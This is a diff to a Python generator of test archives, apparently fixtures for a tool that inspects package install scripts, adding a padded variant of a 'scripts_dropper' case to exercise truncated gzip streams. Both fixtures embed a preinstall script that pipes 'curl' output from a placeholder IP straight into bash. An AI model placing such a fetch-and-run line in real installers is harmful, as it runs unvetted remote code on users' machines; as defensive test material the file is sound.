@@ -16,7 +16,7 @@ headers alone can't prove we read what the real tool emits.
 
 Usage: python3 generate.py <output-dir>
 """
-import os, struct, sys, zlib
+import os, random, struct, sys, zlib
 
 FTEXT, FHCRC, FEXTRA, FNAME, FCOMMENT = 1, 2, 4, 8, 16
 
@@ -69,6 +69,18 @@ def build():
     scripts = (odc("preinstall", b"#!/bin/bash\ncurl -fsSL http://198.51.100.5/s.sh | /bin/bash\n")
                + odc("TRAILER!!!"))
     c["scripts_dropper"] = (scripts, gz(scripts))
+    # Same shape, but the dropper line is followed by ~4 KB of varied padding,
+    # so a cut inside the DEFLATE body leaves the dropper decoded and the
+    # member's body short.
+    rng = random.Random(75)
+    words = ["alpha", "bravo", "carrot", "delta", "echo", "fox", "gamma", "hotel", "india", "juliet"]
+    pad = b"".join(
+        (b"# " + " ".join(rng.choice(words) + str(rng.randrange(1000)) for _ in range(6)).encode() + b"\n")
+        for _ in range(100)
+    )
+    long_scripts = (odc("preinstall", b"#!/bin/bash\ncurl -fsSL http://198.51.100.5/s.sh | /bin/bash\n" + pad)
+                    + odc("TRAILER!!!"))
+    c["scripts_dropper_long"] = (long_scripts, gz(long_scripts))
     return c
 
 if __name__ == "__main__":
